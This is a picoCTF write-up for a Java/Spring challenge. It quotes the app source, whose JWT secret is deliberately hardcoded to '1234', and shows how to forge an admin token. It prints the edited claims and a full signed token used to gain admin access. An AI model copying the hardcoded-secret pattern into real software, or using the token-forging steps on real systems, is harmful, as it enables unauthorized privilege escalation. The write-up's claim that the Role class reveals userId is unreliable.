# Java Code Analysis | picoCTF
# Description
BookShelf Pico, my premium online book-reading service. I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book! Here are the credentials to get you started:
* Username: "user"
* Password: "user"

## Analysis
After loggin in with given credentials `user:user`, we see the following dashboard:
![](images/dashboard)

The flag for this CTF is hidden inside **Flag** book, and we cannot access i because it requires `admin` privilege:
![](images/locked.png)

I used Burp Suite to track down the request and see what it sends:
![](images/bearer.png)

As you can see, the server creates **JWT** and uses it to validate the user. After seeing this it is time to check the source code that was given to us. I have found 3 important files:
```java
package io.github.nandandesai.pico.security;

import com.auth0.jwt.JWT;
import com.auth0.jwt.JWTVerifier;
import com.auth0.jwt.algorithms.Algorithm;
import com.auth0.jwt.exceptions.JWTVerificationException;
import com.auth0.jwt.interfaces.DecodedJWT;
import io.github.nandandesai.pico.security.models.JwtUserInfo;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.util.Calendar;
import java.util.Date;

@Service
public class JwtService {

    private final String SECRET_KEY;

    private static final String CLAIM_KEY_USER_ID = "userId";
    private static final String CLAIM_KEY_EMAIL = "email";
    private static final String CLAIM_KEY_ROLE = "role";
    private static final String ISSUER = "bookshelf";

    @Autowired
    public JwtService(SecretGenerator secretGenerator){
        this.SECRET_KEY = secretGenerator.getServerSecret();
    }

    public String createToken(Integer userId, String email, String role){
        Algorithm algorithm = Algorithm.HMAC256(SECRET_KEY);

        Calendar expiration = Calendar.getInstance();
        expiration.add(Calendar.DATE, 7); //expires after 7 days

        return JWT.create()
                .withIssuer(ISSUER)
                .withIssuedAt(new Date())
                .withExpiresAt(expiration.getTime())
                .withClaim(CLAIM_KEY_USER_ID, userId)
                .withClaim(CLAIM_KEY_EMAIL, email)
                .withClaim(CLAIM_KEY_ROLE, role)
                .sign(algorithm);
    }

    public JwtUserInfo decodeToken(String token) throws JWTVerificationException {
        Algorithm algorithm = Algorithm.HMAC256(SECRET_KEY);
        JWTVerifier verifier = JWT.require(algorithm)
                .withIssuer(ISSUER)
                .build();
        DecodedJWT jwt = verifier.verify(token);
        Integer userId = jwt.getClaim(CLAIM_KEY_USER_ID).asInt();
        String email = jwt.getClaim(CLAIM_KEY_EMAIL).asString();
        String role = jwt.getClaim(CLAIM_KEY_ROLE).asString();
        return new JwtUserInfo().setEmail(email)
                .setRole(role)
                .setUserId(userId);
    }
}
```
```java
package io.github.nandandesai.pico.security;

import io.github.nandandesai.pico.configs.UserDataPaths;
import io.github.nandandesai.pico.utils.FileOperation;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.io.IOException;
import java.nio.charset.Charset;

@Service
class SecretGenerator {
    private Logger logger = LoggerFactory.getLogger(SecretGenerator.class);
    private static final String SERVER_SECRET_FILENAME = "server_secret.txt";

    @Autowired
    private UserDataPaths userDataPaths;

    private String generateRandomString(int len) {
        // not so random
        return "1234";
    }

    String getServerSecret() {
        try {
            String secret = new String(FileOperation.readFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME), Charset.defaultCharset());
            logger.info("Server secret successfully read from the filesystem. Using the same for this runtime.");
            return secret;
        }catch (IOException e){
            logger.info(SERVER_SECRET_FILENAME+" file doesn't exists or something went wrong in reading that file. Generating a new secret for the server.");
            String newSecret = generateRandomString(32);
            try {
                FileOperation.writeFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME, newSecret.getBytes());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            logger.info("Newly generated secret is now written to the filesystem for persistence.");
            return newSecret;
        }
    }
}
```

```java
package io.github.nandandesai.pico.models;

import lombok.Getter;
import lombok.NoArgsConstructor;
import lombok.Setter;
import lombok.experimental.Accessors;

import javax.persistence.*;

@Getter
@Setter
@NoArgsConstructor
@Accessors(chain = true)
@Entity
@Table(name = "roles")
public class Role {
    @Id
    @Column
    private String name;

    @Column
    private Integer value; //higher the value, more the privilege. By this logic, admin is supposed to
    // have the highest value
}
```
In `JwtService` class we can see how the token is being created. It takes `userId`, `email` and `role` properties as an input.

In `SecretGenerator` class we can see one huge vulnerability: `SECRET_KEY` is hardcoded to `1234`. We remember this for future so we can encode our own JWT token).

And `Role` class leakes information about `userId`: higher the value, more the privilege. Assuming `admin` has higher value, we will set `admin` userId to 2.

## Solution
To check current `auth-token` and `token-payload` we can use `Inspection=>Storage=>Local Storage`:
![](images/payload.png)

To gain `admin` privilege we need to edit current `auth-token` and `token-payload`, and then craft a new JWT token. We can use public websites for this purpose:
![](images/jwt.png)

I used www.jwt.io website for this purpose. As you can see, we edited the `auth-token` and changed it to:
```js
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1771351798,
  "iat": 1770746998,
  "userId": 2,
  "email": "admin"
}
```
Later, we used `1234` as `SECRET_KEY` and crafted new JWT token:
```js
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NzEzNTE3OTgsImlhdCI6MTc3MDc0Njk5OCwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.4vJpMdJFM_LA5v4Atrl5qYhLXRrS74kdjrGPqrcgK_c
```

## Answer

Now all we have to do is to change `auth-token` and `token-payload` in `Local Storage` and refresh the page. Now we will have `admin` privilege:
![](images/answer.png)

## Remediation
To avoid **JWT privilege escalation**:
* We need to use strong, non-predictable secret
* Should not trust role or privilege data from JWT alone
* Never allow clients to modify JWT storage freely
